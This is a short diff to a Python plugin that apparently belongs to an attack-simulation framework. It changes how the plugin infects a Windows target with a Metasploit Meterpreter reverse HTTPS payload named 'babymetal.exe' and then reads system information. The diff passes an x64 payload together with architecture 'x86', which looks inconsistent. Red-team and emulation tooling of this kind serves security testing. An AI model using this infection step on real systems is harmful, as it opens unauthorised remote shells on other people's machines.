@@ -27,7 +27,7 @@ class MetasploitSysinfoPlugin(AttackPlugin):
         """
 
         res = ""
-        payload_type = "windows/meterpreter_reverse_https"
+        payload_type = "windows/x64/meterpreter/reverse_https"
         payload_name = "babymetal.exe"
         target = self.targets[0]
 
@@ -36,7 +36,10 @@ class MetasploitSysinfoPlugin(AttackPlugin):
                                        attacker=self.attacker_machine_plugin,
                                        username=self.metasploit_user)
 
-        metasploit.smart_infect(target, payload_type, payload_name, )
+        metasploit.smart_infect(target,
+                                payload=payload_type,
+                                payload_name=payload_name,
+                                architecture="x86")
 
         si = metasploit.sysinfo(target)
         print(f"Sysinfo: {si}")
